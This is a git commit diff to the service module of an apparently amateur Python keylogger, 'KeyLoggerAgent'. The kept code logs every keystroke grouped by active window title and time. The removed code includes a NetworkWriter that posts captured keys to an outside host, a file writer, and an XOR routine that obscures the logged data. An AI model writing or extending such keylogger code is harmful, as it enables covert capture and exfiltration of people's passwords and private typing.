1cc3ae15b29a6abbb0444cdf261203aaa40e604a
moishy shuvax <moishy.shuvax@gmail.com>
2025-02-16 07:08:37 +0200

    update 'service' by moishy

--- KeyLoggerAgent/service.py
+++ KeyLoggerAgent/service.py
@@ -1,7 +1,5 @@
-from Interface import IKeyLogger,Write
-import time,ToolBox,pywinctl, json,requests,random,string
-
-
+import requests,time,ToolBox,pygetwindow,json,random,string
+from Interface import IKeyLogger,IKeyLoggerManager,Write
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.__logged_keys = {}
@@ -13,10 +11,10 @@ class KeyLoggerService(IKeyLogger):
         key = ToolBox.format_key(key)
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
-        active_window = pywinctl.getActiveWindow()
+        active_window = pygetwindow.getActiveWindowTitle()
 
-        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
-            self.__last_record = active_window.title + ': ' + current_time_formatted
+        if self.__last_type_time is None or current_time - self.__last_type_time >= 2 or active_window != self.__last_window:
+            self.__last_record = active_window + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
         self.__last_window = active_window
@@ -25,47 +23,12 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        if len(self.__logged_keys)<1:
-            return {}
-        return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+        # if len(self.__logged_keys)<1:
+        #     return {}
+        # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+        return self.__logged_keys
 
 
     def clear_logged_keys(self) -> dict[str:str]:
         self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
 
-
-
-class FileWriter(Write):
-    def __init__(self,path=None):
-        self.path = path or r""
-
-    def write(self, data:dict[str:str]) -> bool:
-        try:
-            with open(self.path,"a") as file:
-                convert_data = json.dumps(data)
-                file.write(convert_data)
-                return True
-        except IOError:
-            return False
-
-class NetworkWriter(Write):
-    def __init__(self,url=None):
-        self.url = url or "https://keylogger.shuvax.com"
-    def write(self,data:dict[str:str]) -> bool:
-        try:
-            response = requests.post(self.url, json=data)
-            return response.status_code == 200
-        except requests.exceptions.RequestException:
-            return False
-
-
-class Encryptor:
-    def __init__(self):
-        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
-
-    def encrypt(self,data:str) -> str:
-        ciphertext = ""
-        length_key = len(self.key)
-        for i in range(len(data)):
-            ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
-        return ciphertext
